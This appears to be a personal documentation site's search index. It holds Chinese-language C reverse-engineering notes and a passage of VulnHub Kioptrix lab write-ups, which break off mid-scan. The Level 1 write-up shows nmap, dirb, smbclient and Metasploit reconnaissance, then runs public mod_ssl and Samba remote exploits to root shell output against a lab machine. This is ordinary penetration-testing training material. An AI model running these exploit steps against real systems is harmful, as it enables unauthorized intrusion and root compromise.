windows: string terminated with a zero</p> <pre><code>char szBuffer[] = \"hello\";\nchar *szBuffer  = \"hello\";\nwchar_t szBuffer[] = L\"hello\";\nwchar_t *szBuffer  = L\"hello\";\n</code></pre>"},{"location":"RE/langs/C/#_9","title":"\u7ed3\u6784\u7c7b\u578b","text":"<ul> <li>struct</li> <li>union</li> <li>enum</li> </ul>"},{"location":"RE/langs/C/#_10","title":"\u7279\u6b8a\u7c7b\u578b","text":"<ul> <li>auto</li> <li>void</li> <li>[]</li> <li> <ul> <li></li> </ul> </li> </ul>"},{"location":"RE/langs/C/#_11","title":"\u7c7b\u578b\u4fee\u9970","text":"<ul> <li>static</li> <li>signed</li> <li>unsigned</li> <li>const</li> </ul>"},{"location":"RE/langs/C/#_12","title":"\u53d8\u91cf","text":"<p>\u53d8\u91cf\u540d\u89c4\u5219\uff1a</p> <ul> <li>\u4ee5\u82f1\u6587\u5b57\u7b26\u6216\u8005\u4e0b\u5212\u7ebf\u8d77\u59cb</li> <li>\u4e0d\u80fd\u5305\u542b \u7a7a\u683c\u3001\u6807\u70b9\u3001\u7c7b\u578b\u8bf4\u660e\u7b26\u3001\u8fd0\u7b97\u7b26</li> <li>\u5b57\u6bcd\u533a\u5206\u5927\u5c0f\u5199</li> <li>\u6709\u6548\u957f\u5ea6max 255</li> <li>\u4e0d\u80fd\u662f\u5173\u952e\u5b57</li> </ul> <p>\u547d\u540d\u65b9\u6cd5\uff1a</p> <ul> <li>\u5308\u7259\u5229</li> <li>\u9a7c\u5cf0</li> </ul> <p>\u53d8\u91cf\u7c7b\u578b\uff1a</p> <ul> <li>\u5168\u5c40\u53d8\u91cf</li> <li>\u5c40\u90e8\u53d8\u91cf</li> <li>\u9759\u6001\u53d8\u91cf</li> </ul>"},{"location":"RE/langs/C/#_13","title":"\u8f93\u5165\u548c\u8f93\u51fa","text":""},{"location":"RE/langs/C/#_14","title":"\u8f93\u51fa","text":"<p>printf</p> <ul> <li>%c, %s, %S</li> <li>%u, %d (int), %lld (long long)</li> <li>%e, %f</li> <li>%x, %X</li> <li>%p</li> </ul> <p>\u8f6c\u4e49\u5b57\u7b26</p> <ul> <li>\\r \\n \\t</li> <li>\\ \\\u2019 \\\u201d \\?</li> </ul> <p>sprintf</p> <pre><code>sprintf(szBuffer, \"hello %s!\", szName);\n</code></pre>"},{"location":"RE/langs/C/#_15","title":"\u8f93\u5165","text":"<p>scanf</p> <ul> <li>\u201c%d\u201d, &amp;nNumber</li> <li>\u201c%s\u201d, szBuffer</li> </ul>"},{"location":"RE/langs/C/#_16","title":"\u8fd0\u7b97\u7b26","text":""},{"location":"RE/langs/C/#_17","title":"\u7b97\u6570\u8fd0\u7b97\u7b26","text":"<ul> <li>=</li> <li>==, \u2260, &lt;, \u2264, &gt;, \u2265</li> <li>+, -, *, /, %</li> <li>++, \u2014</li> <li>+=, -=, *=, /=, %=</li> </ul>"},{"location":"RE/langs/C/#_18","title":"\u4f4d\u8fd0\u7b97\u7b26","text":"<ul> <li>&amp;, |, ~, ^</li> <li>&lt;&lt;, &gt;&gt;</li> </ul>"},{"location":"RE/langs/C/#_19","title":"\u903b\u8f91\u8fd0\u7b97\u7b26","text":"<ul> <li>&amp;&amp;, ||, !</li> <li>? :</li> </ul>"},{"location":"RE/langs/C/#_20","title":"\u8fd0\u7b97\u7b26\u4f18\u5148\u7ea7","text":""},{"location":"RE/langs/C/#_21","title":"\u9009\u62e9\u7ed3\u6784","text":"<ul> <li>if () {} else if () {} else {}</li> <li>switch () { case 1: { break; } default: { break; } }</li> <li>goto tag;</li> </ul>"},{"location":"RE/langs/C/#_22","title":"\u5faa\u73af\u7ed3\u6784","text":"<ul> <li>while (expr) {}</li> <li>do {} while (expr)</li> <li>for ( ; ; ) {}</li> </ul>"},{"location":"RE/langs/C/#_23","title":"\u51fd\u6570","text":"<ul> <li>\u58f0\u660e</li> <li>\u5b9a\u4e49</li> <li>\u53c2\u6570</li> <li>\u8fd4\u56de\u503c</li> <li>\u53d8\u53c2\u51fd\u6570</li> </ul>"},{"location":"RE/langs/C/#_24","title":"\u53c2\u6570\u7684\u7ec6\u8282","text":"<ul> <li>\u5f62\u5f0f\u53c2\u6570</li> <li>\u5b9e\u9645\u53c2\u6570</li> <li>\u53d8\u53c2\u51fd\u6570</li> </ul> <pre><code>int test(int optcount, ...)\n{\n    va_list ap;\n    va_start(ap, optcount);\n    int nCount = 0;\n    for (int i = 0; i &lt; optcount; i++)\n    {\n        nCount += va_arg(ap, int);\n    }\n    va_end(ap);\n    return nCount;\n}\n</code></pre>"},{"location":"RE/langs/C/#_25","title":"\u9012\u5f52\u51fd\u6570","text":""},{"location":"RE/langs/C/#_26","title":"\u6570\u7ec4\u6307\u9488","text":"<ul> <li>\u4e00\u7ef4\u6570\u7ec4 <pre><code>int arr[5] = { 0,1,2,3,4 };\nint arr[5] = { [3] = 4 };\nint arr[]  = { 0,1,2,3 };\nint arr[]  = { 1,[5]=2 };\n</code></pre></li> <li>\u591a\u7ef4\u6570\u7ec4</li> </ul> <pre><code>int nArr[2][2] = \n{\n    {0,1},\n    {2,3}\n}\n</code></pre>"},{"location":"RE/langs/C/#_27","title":"\u5b57\u7b26\u4e32","text":""},{"location":"RE/langs/C/#_28","title":"\u58f0\u660e","text":"<pre><code>char szStr[] = { 'a','b','c',0 };\nchar szStr[] = \"abc\";\nchar * szStr = \"abc\";\n</code></pre>"},{"location":"RE/langs/C/#_29","title":"\u5b57\u7b26\u4e32\u64cd\u4f5c","text":"<ul> <li>strcat</li> <li>strcpy</li> <li>strcmp</li> </ul>"},{"location":"RE/langs/C/#_30","title":"\u6307\u9488","text":"<p>\u7b26\u53f7\uff1a</p> <ul> <li>*</li> <li>&amp;</li> <li>\u2192</li> </ul> <p>\u6307\u9488\u8fd0\u7b97\uff1a\u5730\u5740 + \u6570\u636e\u7c7b\u578b\u7684\u5bbd\u5ea6 * n</p> <pre><code>int arr[5] = { 0 };\nint * p = arr;\n// use p\nprintf(\"%d\", *p);\nprintf(\"%d\", p[3]);\n</code></pre> <p>\u51fd\u6570\u6307\u9488</p> <pre><code>int func1(int a);\n\ntypedef int (*FuncType1) (int a);\nFuncType1 pfunc = func1;\npfunc(1);\n</code></pre> <p>\u6570\u7ec4 \u6307\u9488 \u4f5c\u4e3a\u51fd\u6570\u53c2\u6570</p> <pre><code>int addAll(int * arr, int nCount);\nint* addAll(int * arr, int nCount);\nint addAll(int * arr, int nCount, int * nRes);\n</code></pre> <p>\u5185\u5b58\u64cd\u4f5c</p> <ul> <li>char * szBuffer = malloc(sizeof(char) * 100)</li> <li>memset(szBuffer, 0xCC, sizeof(char) * 100)</li> <li>free(szBuffer)</li> </ul>"},{"location":"RE/langs/C/#_31","title":"\u9884\u5904\u7406","text":"<pre><code>#define MAX_VALUE 256\n\n#if EXPR1\n...\n#elif EXPR2\n...\n#else\n...\n#endif\n</code></pre>"},{"location":"RE/langs/C/#_32","title":"\u590d\u6742\u6570\u636e\u7c7b\u578b","text":""},{"location":"RE/langs/C/#_33","title":"\u7ed3\u6784\u4f53","text":"<pre><code>struct _Info\n{\n    char szName[50];\n    int age;\n    char szGender[10];\n};\n\ntypedef struct _Info\n{\n    char szName[50];\n    int age;\n    char szGender[10];\n} Info, *PInfo;\n\ntypedef struct\n{\n    char szName[50];\n    int age;\n    char szGender[10];\n} Info;\n</code></pre> <p>\u7b26\u53f7\uff1a</p> <ul> <li>.</li> <li>\u2192</li> </ul>"},{"location":"RE/langs/C/#_34","title":"\u679a\u4e3e","text":"<pre><code>enum MyEnum\n{\n    one,\n    two,\n    three\n};\n</code></pre>"},{"location":"RE/langs/C/#_35","title":"\u7ed3\u6784\u4f53\u5bf9\u9f50","text":"<p>\u5bf9\u9f501 2 4 8 16</p> <p>MSVC\u9ed8\u8ba4\u5bf9\u9f508 /Zp8</p> <p>\u6210\u5458\u504f\u79fb member offset\uff1a\u76f8\u5bf9\u4e8e\u7ed3\u6784\u4f53\u9996\u5730\u5740\u7684\u504f\u79fb</p> <p>\u5bf9\u9f50\u89c4\u5219\uff1a</p> <ul> <li>member offset % min(ZpValue, sizeof(member type)) == 0</li> <li>size % max(member type) == 0</li> </ul> <p>\u8bbe\u7f6e\u5bf9\u9f50\u957f\u5ea6</p> <pre><code>#pragma pack(1)\n</code></pre>"},{"location":"RE/langs/C/#_36","title":"\u6307\u9488\u8fdb\u9636","text":"<p>\u4e8c\u7ea7\u6307\u9488\uff1a\u6307\u5411\u7684\u6bcf\u4e00\u4e2a\u7a7a\u95f4\u90fd\u662f\u4e00\u4e2a\u4e00\u7ea7\u6307\u9488</p> <p>\u4e8c\u7ea7\u6570\u7ec4\uff1a</p> <pre><code>int nArr[3][4];\nint (*p)[4];\np = nArr;\n// when p + i -&gt; p + sizeof(int) * 4\nfor (size_t i = 0; i &lt; 3; i++)\n    for (size_t j = 0; j &lt; 4; j++)\n        printf(\"%d\\r\\n\", *(p[i] +  k));\n</code></pre>"},{"location":"RE/langs/C/#_37","title":"\u6587\u4ef6\u64cd\u4f5c","text":""},{"location":"RE/langs/C/#_38","title":"\u5199\u6587\u4ef6","text":"<p>fopen(path, mode)</p> <ul> <li>r: \u8bfb\u53d6\uff0c\u6587\u4ef6\u4e0d\u5b58\u5728or\u627e\u4e0d\u5230\u5373\u4e3a\u5931\u8d25</li> <li>w: \u6253\u5f00\u7528\u4e8e\u5199\u5165\u7684\u7a7a\u6587\u4ef6\uff1b\u5982\u679c\u7ed9\u5b9a\u6587\u4ef6\u5b58\u5728\uff0c\u5185\u5bb9\u4f1a\u88ab\u9500\u6bc1</li> <li>a: \u6587\u4ef6\u672b\u5c3e\u8ffd\u52a0\uff1b\u65b0\u6570\u636e\u5199\u5165\u4e4b\u524d\u4e0d\u79fb\u9664EOF\uff1b\u6587\u4ef6\u4e0d\u5b58\u5728\u521b\u5efa\u6587\u4ef6</li> <li>r+: \u8bfb\u53d6\u5199\u5165\u6587\u4ef6\uff0c\u6587\u4ef6\u987b\u5b58\u5728</li> <li>w+: \u8bfb\u53d6\u5199\u5165\u7a7a\u6587\u4ef6\uff1b\u6587\u4ef6\u5b58\u5728\uff0c\u5185\u5bb9\u9500\u6bc1</li> <li>a+: \u8bfb\u53d6\u548c\u8ffd\u52a0\uff1b\u65b0\u8f93\u5165\u5199\u5165\u524d\u79fb\u9664EOF\uff1b\u5199\u5165\u5b8c\u6210\uff0cEOF\u4e0d\u4f1a\u8fd8\u539f\uff1b\u6587\u4ef6\u4e0d\u5b58\u5728\u521b\u5efa\u6587\u4ef6</li> </ul> <pre><code>void WriteFile(char * szFilePath, char * szBuffer)\n{\n    FILE * pFile;\n    if ((pFile = fopen(szFilePath, \"w\")) == NULL)\n    {\n        printf(\"failed to open file.\\r\\n\");\n        fclose(pFile);\n        exit(0);\n    }\n    int nRet = fwrite(szBuffer, sizeof(char) * (strlen(szBuffer) + 1), 1, pFile);\n    fclose(pFile);\n}\n</code></pre>"},{"location":"RE/langs/C/#_39","title":"\u8bfb\u6587\u4ef6","text":"<p>fseek(stream, offset, origin)</p> <ul> <li>SEEK_CUR</li> <li>SEEK_END</li> <li>SEEK_SET</li> </ul> <pre><code>char * ReadFile(char * szFilePath)\n{\n    FILE * pFile;\n    char * szReadBuffer;\n    int nReadFileSize = 0;\n    if ((pFile = fopen(szFilePath, \"r\")) == NULL)\n    {\n        printf(\"failed to read file.\\r\\n\");\n        fclose(pFile);\n        exit(0);\n    }\n    fseek(pFile, 0, SEEK_END);\n    nReadFileSize = ftell(pFile);\n    rewind(pFile);\n    szReadBuffer = malloc(sizeof(char) * (nReadFileSize + 1));\n    if (szReadBuffer == NULL)\n    {\n        printf(\"failed to malloc memory.\\r\\n\");\n        fclose(pFile);\n        exit(0);\n    }\n    memset(szReadBuffer, 0, nReadFileSize);\n    int nResLen = 0;\n    nResLen = fread(szReadBuffer, 1, nReadFileSize, pFile);\n    if (nResLen != nReadFileSize)\n    {\n        printf(\"failed to read file.\\r\\n\");\n        fclose(pFile);\n        exit(0);\n    }\n    fclose(pFile);\n    return szReadBuffer;\n}\n</code></pre>"},{"location":"RE/langs/C/#_40","title":"\u5f02\u6216\u52a0\u5bc6\u5b57\u7b26\u4e32","text":"<pre><code>void xorcode(char * szBuffer, int nSize, char cKey)\n{\n    for (size_t i = 0; i &lt; nSize; i++)\n    {\n        szBuffer[i] ^= cKey;\n    }\n}\n</code></pre>"},{"location":"Write-ups/","title":"Index","text":""},{"location":"Write-ups/#vulnhub","title":"vulnhub","text":"<ul> <li> Kioptrix: Level 1 (#1): https://www.vulnhub.com/entry/kioptrix-level-1-1,22/</li> <li> Kioptrix: Level 1.1 (#2): https://www.vulnhub.com/entry/kioptrix-level-11-2,23/</li> <li> Kioptrix: Level 1.2 (#3): https://www.vulnhub.com/entry/kioptrix-level-12-3,24/</li> <li> Kioptrix: Level 1.3 (#4): https://www.vulnhub.com/entry/kioptrix-level-13-4,25/</li> <li> Kioptrix: 2014: https://www.vulnhub.com/entry/kioptrix-2014-5,62/</li> </ul>"},{"location":"Write-ups/vulnhub/KIOPTRIX%202014%20%285%29/","title":"KIOPTRIX 2014 (5)","text":""},{"location":"Write-ups/vulnhub/KIOPTRIX%202014%20%285%29/#machine-info","title":"Machine Info","text":""},{"location":"Write-ups/vulnhub/KIOPTRIX%202014%20%285%29/#pwk","title":"PWK","text":""},{"location":"Write-ups/vulnhub/KIOPTRIX%202014%20%285%29/#recon","title":"recon","text":""},{"location":"Write-ups/vulnhub/KIOPTRIX%202014%20%285%29/#exploit","title":"exploit","text":""},{"location":"Write-ups/vulnhub/KIOPTRIX%202014%20%285%29/#priv-esc","title":"priv-esc","text":""},{"location":"Write-ups/vulnhub/KIOPTRIX%20LEVEL%201%20%281%29/","title":"KIOPTRIX LEVEL 1 (1)","text":""},{"location":"Write-ups/vulnhub/KIOPTRIX%20LEVEL%201%20%281%29/#machine-info","title":"Machine Info","text":"<ul> <li>Name: Kioptrix: Level 1 (#1)</li> <li>Date release: 17 Feb 2010</li> <li>Author: Kioptrix</li> <li>Series: Kioptrix</li> <li>Web page: http://www.kioptrix.com/blog/?page_id=135</li> <li>Vulnhub: Kioptrix: Level 1 (#1) ~ VulnHub</li> </ul>"},{"location":"Write-ups/vulnhub/KIOPTRIX%20LEVEL%201%20%281%29/#pwk","title":"PWK","text":"<ul> <li>nmap</li> </ul> <pre><code>$ sudo nmap -sT -sV -sC -O -p22,80,111,139,443,1024 $IP -oA nmap/detail\nStarting Nmap 7.94 ( https://nmap.org ) at 2023-11-15 00:17 CST\nNmap scan report for 192.168.123.28\nHost is up (0.00069s latency).\n\nPORT     STATE SERVICE     VERSION\n22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)\n| ssh-hostkey:\n|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)\n|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)\n|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)\n|_sshv1: Server supports SSHv1\n80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)\n| http-methods:\n|_  Potentially risky methods: TRACE\n|_http-title: Test Page for the Apache Web Server on Red Hat Linux\n|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b\n111/tcp  open  rpcbind     2 (RPC #100000)\n| rpcinfo:\n|   program version    port/proto  service\n|   100000  2            111/tcp   rpcbind\n|   100000  2            111/udp   rpcbind\n|   100024  1           1024/tcp   status\n|_  100024  1           1024/udp   status\n139/tcp  open  netbios-ssn Samba smbd (workgroup: tMYGROUP)\n443/tcp  open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b\n|_ssl-date: 2023-11-14T17:20:07+00:00; +1h01m50s from scanner time.\n| sslv2:\n|   SSLv2 supported\n|   ciphers:\n|     SSL2_DES_64_CBC_WITH_MD5\n|     SSL2_RC2_128_CBC_WITH_MD5\n|     SSL2_RC4_128_EXPORT40_WITH_MD5\n|     SSL2_DES_192_EDE3_CBC_WITH_MD5\n|     SSL2_RC4_64_WITH_MD5\n|     SSL2_RC4_128_WITH_MD5\n|_    SSL2_RC2_128_CBC_EXPORT40_WITH_MD5\n| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--\n| Not valid before: 2009-09-26T09:32:06\n|_Not valid after:  2010-09-26T09:32:06\n|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b\n|_http-title: 400 Bad Request\n1024/tcp open  status      1 (RPC #100024)\nMAC Address: 00:0C:29:56:FD:5F (VMware)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning: Linux 2.4.X\nOS CPE: cpe:/o:linux:linux_kernel:2.4\nOS details: Linux 2.4.9 - 2.4.18 (likely embedded)\nNetwork Distance: 1 hop\n\nHost script results:\n|_smb2-time: Protocol negotiation failed (SMB2)\n|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)\n|_clock-skew: 1h01m49s\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 36.60 seconds\n</code></pre> <ul> <li> <p>80 - http - no work</p> <ul> <li>path</li> </ul> </li> </ul> <pre><code>$ dirb http://$IP\n\n-----------------\nDIRB v2.22\nBy The Dark Raver\n-----------------\n\nSTART_TIME: Wed Nov 15 01:30:18 2023\nURL_BASE: http://192.168.123.28/\nWORDLIST_FILES: /usr/share/dirb/wordlists/common.txt\n\n-----------------\n\nGENERATED WORDS: 4612\n\n---- Scanning URL: http://192.168.123.28/ ----\n+ http://192.168.123.28/~operator (CODE:403|SIZE:273)\n+ http://192.168.123.28/~root (CODE:403|SIZE:269)\n+ http://192.168.123.28/cgi-bin/ (CODE:403|SIZE:272)\n+ http://192.168.123.28/index.html (CODE:200|SIZE:2890)\n==&gt; DIRECTORY: http://192.168.123.28/manual/\n==&gt; DIRECTORY: http://192.168.123.28/mrtg/\n==&gt; DIRECTORY: http://192.168.123.28/usage/\n\n---- Entering directory: http://192.168.123.28/manual/ ----\n(!) WARNING: Directory IS LISTABLE. No need to scan it.\n    (Use mode '-w' if you want to scan it anyway)\n\n---- Entering directory: http://192.168.123.28/mrtg/ ----\n+ http://192.168.123.28/mrtg/index.html (CODE:200|SIZE:17318)\n\n---- Entering directory: http://192.168.123.28/usage/ ----\n+ http://192.168.123.28/usage/index.html (CODE:200|SIZE:3704)\n\n-----------------\nEND_TIME: Wed Nov 15 01:30:44 2023\nDOWNLOADED: 13836 - FOUND: 6\n</code></pre> <ul> <li>mrtg [x]</li> <li>manual [x]</li> <li>searchsploit apache [x]</li> </ul> <pre><code>$ searchsploit apache 1.3.20\nApache mod_ssl &lt; 2.8.7 OpenSSL - 'OpenFuck.c' Remote Buffer Overflow                                                                 | unix/remote/21671.c [x]\nApache mod_ssl &lt; 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (1)                                                           | unix/remote/764.c   [x]\nApache mod_ssl &lt; 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (2)                                                           | unix/remote/47080.c [*]\n\n$ searchsploit apache 1.3 remote\nApache 1.3.x mod_mylo - Remote Code Execution                                                                                        | multiple/remote/67.c\nRed-Hat version: unknow\n=&gt;\n$ ./67 -t $IP -T 1\n[-] Attempting attack [ RedHat 7.2, Apache 1.3.20 (installed from RPM) ] ...\n[-] Trying 0x08105104 ...\n\n\n\n[*] Connection to 196.168.123.28 was rejected\n\nHave a nice day!\n\n=&gt; 47080\n$ ./OpenFuck\n\n*******************************************************************\n* OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open *\n*******************************************************************\n* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *\n* #hackarena  irc.brasnet.org                                     *\n* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *\n* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *\n* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *\n*******************************************************************\n\n: Usage: ./OpenFuck target box [port] [-c N]\n\n  target - supported box eg: 0x00\n  box - hostname or IP address\n  port - port for ssl connection\n  -c open N connections. (use range 40-50 if u dont know)\n\n\n  Supported OffSet:\n        0x6a - RedHat Linux 7.2 (apache-1.3.20-16)1\n        0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2\n\nFuck to all guys who like use lamah ddos. Read SRC to have no surprise\n\n$ ./OpenFuck 0x6a $IP 443 -c 45\n\n*******************************************************************\n* OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open *\n*******************************************************************\n* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *\n* #hackarena  irc.brasnet.org                                     *\n* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *\n* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *\n* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *\n*******************************************************************\n\nConnection... 1 of 45Connection to 196.168.123.28:443 failed: Connection timed out\n</code></pre> <ul> <li>139 - smb<ul> <li>file lekage -&gt; smbclient connect [x]</li> </ul> </li> </ul> <pre><code>$ smbclient //$IP/IPC$\nPassword for [WORKGROUP\\qwe]:\nServer does not support EXTENDED_SECURITY  but 'client use spnego = yes' and 'client ntlmv2 auth = yes' is set\nAnonymous login successful\nTry \"help\" to get a list of possible commands.\nsmb: \\&gt; dir\nNT_STATUS_NETWORK_ACCESS_DENIED listing \\*\nsmb: \\&gt; ls\nNT_STATUS_NETWORK_ACCESS_DENIED listing \\*\nsmb: \\&gt; ^C\n\n$ smbclient //$IP/ADMIN$\nPassword for [WORKGROUP\\qwe]:\nServer does not support EXTENDED_SECURITY  but 'client use spnego = yes' and 'client ntlmv2 auth = yes' is set\nAnonymous login successful\ntree connect failed: NT_STATUS_WRONG_PASSWORD\n</code></pre> <ul> <li>smb version - exploit - 2 ways ok<ul> <li>trans2open Overflow</li> <li>Remote Code Execution [this wp]</li> </ul> </li> </ul> <pre><code>msf6 &gt; search scanner smb version\n\nMatching Modules\n================\n\n   #  Name                               Disclosure Date  Rank    Check  Description\n   -  ----                               ---------------  ----    -----  -----------\n   0  auxiliary/scanner/smb/smb_version                   normal  No     SMB Version Detection\n\n\nInteract with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/smb/smb_version\n\nmsf6 &gt; use 0\nmsf6 auxiliary(scanner/smb/smb_version) &gt; show options\n\nModule options (auxiliary/scanner/smb/smb_version):\n\n   Name     Current Setting  Required  Description\n   ----     ---------------  --------  -----------\n   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html\n   THREADS  1                yes       The number of concurrent threads (max one per host)\n\n\nView the full module info with the info, or info -d command.\n\nmsf6 auxiliary(scanner/smb/smb_version) &gt; set RHOST\nset RHOSTNAME  set RHOSTS\nmsf6 auxiliary(scanner/smb/smb_version) &gt; set RHOSTS 192.168.123.28\nRHOSTS =&gt; 192.168.123.28\nmsf6 auxiliary(scanner/smb/smb_version) &gt; run\n\n[*] 192.168.123.28:139    - SMB Detected (versions:) (preferred dialect:) (signatures:optional)\n[*] 192.168.123.28:139    -   Host could not be identified: Unix (Samba 2.2.1a)\n[*] 192.168.123.28:       - Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\n</code></pre> <pre><code>=&gt; searchsploit samba 2.2.1\n$ searchsploit samba 2.2.1\n\nSamba 2.2.0 &lt; 2.2.8 (OSX) - trans2open Overflow (Metasploit)                                                                         | osx/remote/9924.rb\nSamba &lt; 2.2.8 (Linux/BSD) - Remote Code Execution                                                                                    | multiple/remote/10.c\nSamba &lt; 3.0.20 - Remote Heap Overflow                                                                                                | linux/remote/7701.txt\nSamba &lt; 3.6.2 (x86) - Denial of Service (PoC)                                                                                        | linux_x86/dos/36741.py\n\nShellcodes: No Results\n\n\nDONE:\nUsage: ./sambal [-bBcCdfprsStv] [host]\n\n-b &lt;platform&gt;   bruteforce (0 = Linux, 1 = FreeBSD/NetBSD, 2 = OpenBSD 3.1 and prior, 3 = OpenBSD 3.2)\n-B &lt;step&gt;       bruteforce steps (default = 300)\n-c &lt;ip address&gt; connectback ip address\n-C &lt;max childs&gt; max childs for scan/bruteforce mode (default = 40)\n-d &lt;delay&gt;      bruteforce/scanmode delay in micro seconds (default = 100000)\n-f              force\n-p &lt;port&gt;       port to attack (default = 139)\n-r &lt;ret&gt;        return address\n-s              scan mode (random)\n-S &lt;network&gt;    scan mode\n-t &lt;type&gt;       presets (0 for a list)\n-v              verbose mode\n\n$ ./sambal -d 0 -C 60 -S 192.168.123\nsamba-2.2.8 &lt; remote root exploit by eSDee (www.netric.org|be)\n--------------------------------------------------------------\n+ Scan mode.\n+ [192.168.123.28] Samba\n^C\n\n$ ./sambal -d 0 -v -b 0 192.168.123.28\n+ Worked!\n--------------------------------------------------------------\n*** JE MOET JE MUIL HOUWE\nLinux kioptrix.level1 2.4.7-10 #1 Thu Sep 6 16:46:36 EDT 2001 i686 unknown\nuid=0(root) gid=0(root) groups=99(nobody)\n</code></pre>"},{"location":"Write-ups/vulnhub/KIOPTRIX%20LEVEL%201.1%20%282%29/","title":"KIOPTRIX LEVEL 1.1 (2)","text":""},{"location":"Write-ups/vulnhub/KIOPTRIX%20LEVEL%201.1%20%282%29/#machine-info","title":"Machine Info","text":"<ul> <li>Name: Kioptrix: Level 1.1 (#2)</li> <li>Date release: 11 Feb 2011</li> <li>Author: Kioptrix</li> <li>Series: Kioptrix</li> <li>Web page: http://www.kioptrix.com/blog/?page_id=135</li> <li>Vulnhub: Kioptrix: Level 1.1 (#2) ~ VulnHub</li> </ul>"},{"location":"Write-ups/vulnhub/KIOPTRIX%20LEVEL%201.1%20%282%29/#pwk","title":"PWK","text":""},{"location":"Write-ups/vulnhub/KIOPTRIX%20LEVEL%201.1%20%282%29/#recon","title":"recon","text":"<ul> <li>nmap</li> </ul> <pre><code>$ sudo nmap -sT -sV -sC -O -p22,80,111,443,631,778,3306 $IP -oA nmap/detail\nStarting Nmap 7.94 ( https://nmap.org ) at 2023-11-15 04:06 CST\nNmap scan report for 192.168.123.75\nHost is up (0.0010s latency).\n\nPORT     STATE SERVICE  VERSION\n22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)\n|_sshv1: Server supports SSHv1\n| ssh-hostkey:\n|   1024 8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72 (RSA1)\n|   1024 34:6b:45:3d:ba:ce:ca:b2:53:55:ef:1e:43:70:38:36 (DSA)\n|_  1024 68:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61 (RSA)\n80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))\n|_http-title: Site doesn't have a title (text/html; charset=UTF-8).\n|_http-server-header: Apache/2.0.52 (CentOS)\n111/tcp  open  rpcbind  2 (RPC #100000)\n| rpcinfo:\n|   program version    port/proto  service\n|   100000  2            111/tcp   rpcbind\n|_  100000  2            111/udp   rpcbind\n443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))\n| sslv2:\n|   SSLv2 supported\n|   ciphers:\n|     SSL2_RC4_64_WITH_MD5\n|     SSL2_RC4_128_EXPORT40_WITH_MD5\n|     SSL2_DES_192_EDE3_CBC_WITH_MD5\n|     SSL2_DES_64_CBC_WITH_MD5\n|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5\n|     SSL2_RC2_128_CBC_WITH_MD5\n|_    SSL2_RC4_128_WITH_MD5\n|_http-title: Site doesn't have a title (text/html; charset=UTF-8).\n|_http-server-header: Apache/2.0.52 (CentOS)\n| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--\n| Not valid before: 2009-10-08T00:10:47\n|_Not valid after:  2010-10-08T00:10:47\n|_ssl-date: 2023-11-14T17:57:13+00:00; -2h09m39s from scanner time.\n631/tcp  open  ipp      CUPS 1.1\n|_http-server-header: CUPS/1.1\n| http-methods:\n|_  Potentially risky methods: PUT\n|_http-title: 403 Forbidden\n778/tcp  open  status   1 (RPC #100024)\n3306/tcp open  mysql    MySQL (unauthorized)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose|printer|specialized|remote management|media device|WAP|terminal server\nRunning (JUST GUESSING): Linux 2.6.X (97%), HP embedded (95%), Riverbed RiOS (94%), Aruba ArubaOS 3.X (93%), Star Track embedded (93%), Aerohive HiveOS 3.X (92%), Source Technologies embedded (92%), Aruba embedded (92%)\nOS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:riverbed:rios cpe:/o:arubanetworks:arubaos:3.3.2 cpe:/o:linux:linux_kernel:2.6.23 cpe:/h:star_track:srt2014hd cpe:/o:aerohive:hiveos:3.4 cpe:/h:sourcetechnologies:st-9650 cpe:/h:arubanetworks:iap-105\nAggressive OS guesses: Linux 2.6.9 - 2.6.30 (97%), Linux 2.6.18 - 2.6.32 (96%), Linux 2.6.9 (95%), HP Designjet T1100ps or Z3100ps printer (95%), Linux 2.6.8 - 2.6.12 (94%), Linux 2.6.9 - 2.6.18 (94%), Riverbed Steelhead Mobile Controller 4.0.3 (94%), Linux 